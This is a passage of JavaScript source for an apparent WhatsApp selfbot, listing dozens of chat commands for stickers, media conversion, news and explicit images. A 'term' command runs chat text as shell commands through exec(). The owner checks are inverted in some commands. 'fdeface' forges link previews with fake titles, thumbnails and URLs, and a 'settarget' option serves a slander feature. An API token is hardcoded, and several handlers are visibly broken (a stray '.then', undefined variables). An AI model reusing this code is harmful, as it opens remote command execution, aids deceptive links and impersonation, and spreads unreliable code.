          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await pato.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			fakestatus('Hecho mi amo 7~7')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case prefix+ 'setprefix':
	  if (isMe) return('No eres mi dueño UnU?')
			prefix = q
			fakegroup(`Succes Mengganti Prefix : ${q}`)
			break
	case prefix+ 'setthumb':
		  if (isMe) return('No eres mi dueño UnU?')
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await pato.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumb.jpeg`, delb)
			fakestatus('Hecho mi amo 7~7')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
    case prefix+ 'settarget':
	  if (isMe) return('No eres mi dueño UnU?')
            if(!q) return reply(`${prefix}settarget 503xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
case prefix+ 'term':
if (!isMe) return reply('Solo mi dueño satan UnU')
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`pato@self:~$ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
			})
		    break 
//INFORMATION
    case prefix+ 'covidindo':
                ci = await covidindo()
                var { kasus, kematian, sembuh } = ci[0]
                reply(`Caso : ${kasus}\n\nMuerto : ${kematian}\n\nHelado : ${sembuh}`)
                break
    case prefix+ 'covidworld':
                 cw= await covidworld()
                var { kasus, kematian, sembuh } = cw[0]
                reply(`Casos : ${kasus}\n\nMuertos : ${kematian}\n\nReponerse : ${sembuh}`)
                break
    case prefix+ 'cnn':
                var result = await cnn()
                cn = 'CNN NEWS'
                for (let i = 0; i < result.length; i++) {
                  cn += `\n\nTitle : ${result[i].judul}\nLink : ${result[i].link}\nImage: ${result[i].thumb}`
                }
                buff = await getBuffer(result[0].thumb)
                pato.sendMessage(from, buff, MessageType.image, {caption: cn})
                break
    case prefix+ 'infogempa':
                tres = await Gempa()
                var { Waktu, Lintang, Bujur, Magnitude, Kedalaman, Wilayah, Map } = tres.result
                console.log(Map)
                captt = `Waktu : ${Waktu}\nLintang : ${Lintang}\nBujur : ${Bujur}\nWilayah : ${Wilayah}`
                thumbbb = await getBuffer(Map)
                pato.sendMessage(from, thumbbb, MessageType.image, {caption: `${captt}`})
                break
//tools
     case prefix+ 'get':
      if(!q) return reply('link :3?')
			.then(res => res.json())
			qweryna = args.join(' ')
			eses = await axios.get(`https://shot.screenshotapi.net/screenshot?token=D2TDY3F-G5YMM94-K9JEQT8-FYBDQBB&url=${qweryna}&full_page=true&fresh=true&output=json&file_type=png&wait_for_event=load`)
			buffqw = await getBuffer(eses.data.screenshot)
			pato.sendMessage(from, buffqw, image, {quoted: mek})
			.catch(err => {
				return('Repitiendo señor hay un errorc...')
			})
			break
    case prefix+ 'revip':
			if (args.length < 1) return reply('Domain/Ip nya mana bang??')
			var qwery = args.join(' ')
			var repip = await fetchJson(`https://sonar.omnisint.io/reverse/${qwery}`)
			pato.sendMessage(from, `${repip}`, text)
      .catch((error) => {
            reply('Invalid domain/ip'); 
            })
			break
//WIBU
case prefix+ 'avatar':
			anu = await axios.get('https://nekos.life/api/v2/img/avatar')
				avatars = await getBuffer(anu.data.url)
				pato.sendMessage(from, avatars, image, {quoted: mek})
			break
		case prefix+ 'loli':
		  anu = await axios.get('https://nekos.life/api/v2/img/neko')
				loliz = await getBuffer(anu.data.url)
				pato.sendMessage(from, loliz, image, {quoted: mek})
			break
		case prefix+ 'waifu':
			waifud = await axios.get('https://nekos.life/api/v2/img/waifu')
			nyed = await getBuffer(waifud.data.url)
			pato.sendMessage(from, nyed, image, { caption: 'Gatau caption nya apa', quoted: mek })
			.catch(err => {
				return('Pwrdon... T_T')
			})
			break
	case prefix+ 'husbu':
			husbud = await fetchJson(`https://api.fdci.se/rep.php?gambar=husbu`)
			sasu = JSON.parse(JSON.stringify(husbud));
			ke =  sasu[Math.floor(Math.random() * sasu.length)];
			nye = await getBuffer(ke)
			pato.sendMessage(from, nye, image, { caption: 'Gatau caption nya apa', quoted: mek })
			.catch(err => {
				return('Perdon... T-T')
			})
			break
//IMAGE
case prefix+ 'image':
            if (args.length < 1) return reply('Ingrese texto!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            pato.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
case prefix+ 'pinterest':
			goblog = args.join(" ")
			anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=${goblog}`)
			sasu = JSON.parse(JSON.stringify(anu));
			ke =  sasu[Math.floor(Math.random() * sasu.length)];
			nye = await getBuffer(ke)
			pato.sendMessage(from, nye, image, { caption: 'SATANCITO ᵈᵃʳʸ⛥', quoted: mek })
			.catch(err => {
				return('de nuevo genial? qué estás buscando?')
			})
			break
    case prefix+ 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            pato.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
	case prefix+ 'wallpaperanime':
			wanime = await axios.get('https://nekos.life/api/v2/img/wallpaper')
			bufwanime = await getBuffer(wanime.data.url)
			pato.sendMessage(from, bufwanime, image, { quoted: mek })
			.catch(err => {
			return('Anuncio con errores de nuevo intente..')
			})
			break
//HARAM FEATURE
case prefix+ 'nsfwavatar':
			anu = await axios.get('https://nekos.life/api/v2/img/nsfw_avatar')
				nsavatar = await getBuffer(anu.data.url)
				pato.sendMessage(from, nsavatar, image, {quoted: mek})
			.catch(err => {
			return('Error 7-7.')
			})	
			break
case prefix+ 'nekopoi':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/nsfw_neko_gif')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'pussy':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/pussy')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'pussyimage':
  pusiimg = await axios.get('https://nekos.life/api/v2/img/pussy_jpg')
			bufpusy = await getBuffer(pusiimg.data.url)
				pato.sendMessage(from, bufpusy, MessageType.image, {quoted: mek})
			.catch(err => {
			return('Error 7-7.')
			})
			break
case prefix+ 'oppai':
			opai = await axios.get('https://nekos.life/api/v2/img/tits')
			opaiz = await getBuffer(opai.data.url)
			pato.sendMessage(from, opaiz, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7.')
			})
			break
case prefix+ 'feetg':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/feetg')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'bj':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/bj')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'ero':
			eroz = await axios.get('https://nekos.life/api/v2/img/ero')
			bufero = await getBuffer(eroz.data.url)
			pato.sendMessage(from, bufero, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7.')
			})
			break
case prefix+ 'erokemo':
			erokz = await axios.get('https://nekos.life/api/v2/img/erokemo')
			erokzs = await getBuffer(erokz.data.url)
			pato.sendMessage(from, erokzs, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7.')
			})
			break
case prefix+ 'eroyuri':
			eroyuriz = await axios.get('https://nekos.life/api/v2/img/eroyuri')
			buferoyu = await getBuffer(opai.data.url)
			pato.sendMessage(from, buferoyu, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7')
			})
			break
case prefix+ 'tickle':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/tickle')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'feed':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/feed')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'kuni':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/kuni')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'femdom':
      anu = await axios.get('https://nekos.life/api/v2/img/femdom')
			bupemdom = await getBuffer(anu.data.url)
				pato.sendMessage(from, bupemdom, image, {quoted: mek})
			.catch(err => {
			return('Error 7-7.')
			})
			break
case prefix+ 'futanari':
			futan = await axios.get('https://nekos.life/api/v2/img/futanari')
			futanz = await getBuffer(futan.data.url)
			pato.sendMessage(from, futanz, image, { quoted: mek })
			break
case prefix+ 'les':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/les')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'trap':
			trapx = await axios.get('https://nekos.life/api/v2/img/tits')
			traps = await getBuffer(trapx.data.url)
			pato.sendMessage(from, traps, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7.')
			})
			break
case prefix+ 'pat':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/pat')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'boobs':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/boobs')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'blowjob':
			blowz = await axios.get('https://nekos.life/api/v2/img/blowjob')
			bufblowz = await getBuffer(blowz.data.url)
			pato.sendMessage(from, bufblowz, image, {quoted: mek})
			.catch(err => {
			return('Error 7-7.')
			})
			break
	case prefix+ 'hentai':
			hentaiz = await axios.get('https://nekos.life/api/v2/img/hentai')
			bufhtz = await getBuffer(hentaiz.data.url)
			pato.sendMessage(from, bufhtz, image, {quoted: mek})
			.catch(err => {
			return('Error 7-7.')
			})
			break
	case prefix+ 'hololewed':
			hololew = await axios.get('https://nekos.life/api/v2/img/hololewd')
			hololewx = await getBuffer(hololew.data.url)
			pato.sendMessage(from, hololewx, image, { quoted: mek })
			.catch(err =>{
			  return('Pwro')
			})
			break
case prefix+ 'lewd':
			lewdd = await axios.get('https://nekos.life/api/v2/img/lewd')
			buflewd = await getBuffer(lewdd.data.url)
			pato.sendMessage(from, buflewd, image, { quoted: mek })
			
			break
	case prefix+ 'lewdk':
			lewdkk = await axios.get('https://nekos.life/api/v2/img/lewdk')
			lewdkz = await getBuffer(lewdkz.data.url)
			pato.sendMessage(from, lewdkz, image, { quoted: mek })
			.catch(err =>{
			  return('Pwro..')
			})
			break
case prefix+ 'lewdkemo':
			lewdkm = await axios.get('https://nekos.life/api/v2/img/lewdkemo')
			buflewd = await getBuffer(lewdkm.data.url)
			pato.sendMessage(from, buflewd, image, { quoted: mek })
			.catch(err => {
			return('Pwro..')
			})
			break
case prefix+ 'goose':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/goose')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'solog':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/solog')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'yuri':
			yuriz = await axios.get('https://nekos.life/api/v2/img/tits')
			bupyuri = await getBuffer(yuriz.data.url)
			pato.sendMessage(from, bupyuri, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7.')
			})
			break
	case prefix+ 'anal':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/anal')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break		
case prefix+ 'pwankg':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/pwankg')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'eron':
			eronz = await axios.get('https://nekos.life/api/v2/img/eron')
			buferon = await getBuffer(eronz.data.url)
			pato.sendMessage(from, buferon, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7..')
			})
			break
case prefix+ 'kiss':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/kiss')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'keta':
			ketaz = await axios.get('https://nekos.life/api/v2/img/keta')
			bufketa = await getBuffer(ketaz.data.url)
			pato.sendMessage(from, bufketa, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7..')
			})
			break
case prefix+ 'cum':
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/cum')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				pato.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			break
case prefix+ 'cumimage':
			cumjpg = await axios.get('https://nekos.life/api/v2/img/cum_jpg')
			bupjpg = await getBuffer(cumjpg.data.url)
			pato.sendMessage(from, bupjpg, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7..')
			})
			break
case prefix+ 'oppai':
			opai = await axios.get('https://nekos.life/api/v2/img/tits')
			opaiz = await getBuffer(opai.data.url)
			pato.sendMessage(from, opaiz, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7..')
			})
			break
case prefix+ 'holoero':
		holox = await axios.get('https://nekos.life/api/v2/img/holoero')
			bufholox = await getBuffer(holox.data.url)
			pato.sendMessage(from, bufholox, image, { quoted: mek })
			.catch(err => {
			return('Error 7-7..')
			})
			break
//MAKER
    case prefix+ 'sticker': 
    case prefix+ 'stiker':
    case prefix+ 'sg':
    case prefix+ 's':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await pato.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                pato.sendMessage(from, fs.readFileSync(ran), MessageType.sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await pato.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            pato.sendMessage(from, fs.readFileSync(ran), MessageType.sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDuracion del video de 1-9 segundos`)
            }
            break
	case prefix+ 'stikerwm':
	case prefix+ 'stickerwm':
    case prefix+ 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await pato.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            pato.sendMessage(from, 'Hay un error', 'Intenta de nuevo', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            pato.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await pato.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            pato.sendMessage(from, 'Ocurrió un error ',' conversación', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            pato.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case prefix+ 'take':
    case prefix+ 'colong':
    		if (!isQuotedSticker) return reply('solo pegatinas')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await pato.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `SELF`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `BOT`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, pato, mek, from)
			break
    case prefix+ 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await pato.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await pato.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		pato.sendMessage(from, mat, MessageType.extendedText, anu)
            break
case prefix+ 'emoji':
			if (!q) return fakegroup('emoji UnU?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
           .catch((err) => {
            reply('Ahhh pwrdon T-T no pude'); 
            })
    		break
case prefix+ 'attp':
						if (args.length < 1) return reply(`Text Nya Mana Ajg?\n> *Contoh* : *${prefix}attp* _Aku Ganz_`)
						attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
						pato.sendMessage(from, attp2, MessageType.sticker, {quoted: mek})
						break
//MAKERIMAGE
//COMINGSOON
//CONVERTER
    case prefix+ 'toimg':
			if (!isQuotedSticker) return reply('Responde a un sticker!')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await pato.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Bueno, falló, inténtalo de nuevo ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
    case prefix+ 'tovid':
    case prefix+ 'tovideo':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await pato.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('responde stiker')
            }
            fs.unlinkSync(owgi)
            break
    case prefix+ 'tomp3':
            if (!isQuotedVideo) return fakegroup('Responde video UnU!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await pato.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            pato.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case prefix+ 'fast':
            if (!isQuotedVideo) return fakegroup('Reponde video UnU 📸')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await pato.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            pato.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
